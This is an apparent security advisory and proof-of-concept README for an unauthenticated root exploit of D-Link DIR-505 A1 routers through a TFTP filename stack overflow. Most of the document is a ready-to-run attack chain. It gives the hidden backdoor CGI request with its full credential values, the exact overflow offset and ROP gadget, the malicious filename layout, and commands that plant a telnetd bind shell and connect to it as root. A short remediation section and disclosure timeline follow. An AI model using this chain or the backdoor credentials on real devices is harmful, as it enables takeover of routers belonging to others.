# D-Link DIR-505 A1 (FW110B02) — Pre-auth RCE via TFTP Filename Stack Overflow (ROP)

Advisory and Proof-of-Concept for a stack-based buffer overflow in the TFTP upload path of
**D-Link DIR-505 A1 firmware 1.10B02**, leading to unauthenticated remote code execution as root.

| | |
|---|---|
| Affected | D-Link DIR-505 A1 — firmware **1.10B02** (`DIR-505_A1_FW110B02.bin`, MD5 `cd13a30e3f971c23eace3ae94380f28b`) |
| Components | `/usr/bin/tftpd`, `/lib/libputil.so` (`save_upload_file`, `mp_upload_file`) |
| Class | CWE-121 (stack-based buffer overflow) → CWE-78 (command execution) |
| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 Critical** |
| Precondition | TFTP daemon running — it is started **without authentication** by a hidden maintenance backdoor (`POST /secmark1524.cgi`); the upload path itself performs no authentication either |
| Status | Verified end-to-end on emulated real firmware; **root shell obtained** |

> ⚠️ Research advisory for an end-of-life device. Use only on devices you own.

## TL;DR

TFTP uploads (`WRQ`) copy the attacker-controlled **filename** into fixed stack buffers:

- `save_upload_file()`: `strcpy(buf[30], "/tmp/<filename>")` — saved `$ra` at **filename offset 47**
- `mp_upload_file()`: `sprintf(buf[64], "/tmp/%s", filename)` — fills the caller frame, giving the
  deterministic mapping `content(sp+m) = filename[0x33+m]`

Set `filename[47..50] = libputil_base + 0x6838` and the daemon executes:

```
0x6838  lw      $t9, GOT(system)
0x683c  addiu   $s1, $sp, 0x28      ; command pointer computed from $sp at runtime
0x6840  jalr    $t9
0x6844  move    $a0, $s1            ; -> system(sp+0x28)
```

The command string is carried in the same filename (offset 91+, NUL-terminated by the copy).
Verified chain (all unauthenticated):

```
backdoor -> root tftpd -> plant script /tmp/x -> ROP executes system("sh</tmp/x") -> root shell
```

Note: the daemon **truncates the filename at the first whitespace byte**, so exploit commands are
written space-free (`id>/tmp/q`, `sh</tmp/x`, ...).

## File format of the malicious filename

| offset | content |
|---|---|
| 0..46 | filler (`A`), avoiding NUL |
| **47..50** | **`libputil_base + 0x6838`** (big-endian) |
| 51..90 | filler |
| **91..** | **space-free shell command** (becomes `system()` argument) |

## PoC

```bash
# 0) tftpd is started unauthenticated by the hidden backdoor:
curl -X POST "http://<device>/secmark1524.cgi" \
  --data "accu=mp1524&pass=kmark43&code=smpwdc&hash=/lJ9NwfO3rRGcAkzv49mmA1&cmds=dGZ0cGQ="

# 1) get libputil base (lab: via console /proc/<tftpd>/maps; remote: leak or brute force —
#    tftpd forks per request so base + stack stay constant for the parent's lifetime)
# 2) run the full PoC (plant script + ROP + verify):
./poc/poc_rop_rce.sh <device> 0x7724d000 2444
nc <device> 2444        # BusyBox root shell
```

Individual steps:

```bash
printf 'telnetd -p 2444 -l /bin/sh\necho RCE>/tmp/rc_proof\n' > /tmp/s
python3 poc/tftp_client.py put <device> /tmp/s x                     # plant /tmp/x
python3 poc/gen_tftpd_rop.py 0x7724d000 "sh</tmp/x"                  # build malicious filename
python3 poc/tftp_client.py put <device> dummy "hex:$(cat rop_fname.hex)"
```

## Repository contents

```
report/Vulnerability_Report.md   full advisory (technical detail, impact, remediation)
analysis/rop_layout.md           overflow mechanics, stack mapping, gadget, quirks
poc/gen_tftpd_rop.py             builds the malicious filename from base + command
poc/poc_rop_rce.sh               full chain PoC (plant + ROP + verify)
poc/tftp_client.py               minimal TFTP client (hex: filename support)
evidence/                        kernel oops dumps, calibration, root-shell proof
```

## Evidence summary

| file | content |
|---|---|
| `evidence/01_calibration_ra_deadbeee.txt` | `epc/ra = 0xdeadbeef`, `BadVA = deadbeee` — exact `$ra` control (offset 47) |
| `evidence/02_gadget_execution_oops.txt` | `ra = 0x<base>+0x6848` — gadget executed, `system()` returned |
| `evidence/03_stack_overflow_crash.txt` | overflowing filename crashes the child (`BadVA 41414140`) |
| `evidence/04_filename_whitespace_truncation.txt` | filename truncated at first whitespace |
| `evidence/05_rop_exec_proof.txt` | `/tmp/q`, `/tmp/rc_proof = RCE_VIA_TFTP_ROP`, `uname -a` |
| `evidence/06_root_shell_process.txt` | `ps`: `telnetd -p 2327 -l /bin/sh` as root |
| `evidence/07_root_shell_session.txt` | interactive root shell transcript |
| `evidence/08_rop_payload.hex` | malicious filename (hex) |

## Related advisories (same device family)

- Hidden maintenance backdoor `POST /secmark1524.cgi` → unauthenticated root TFTP (precondition).
- Unauthenticated TFTP upload chain: arbitrary root file write (path traversal), firmware flash,
  and the filename overflow described here.

## Remediation

Remove the hidden backdoor; use bounded copies (`strlcpy`/`snprintf`) for filenames; reject path
separators; require authentication and drop privileges in any file-transfer service; do not ship
debug daemons in production firmware.

## Disclosure timeline

| date | event |
|---|---|
| 2026-10-13 | overflow discovered, exploited end-to-end (root shell), evidence captured |
| `<DATE>` | vendor notified (`security@dlink.com`); submitted to VulDB (CVE requested) |
| `<DATE>` | public advisory + PoC released |

## License

PoC scripts: MIT. Advisory text: CC0-1.0.
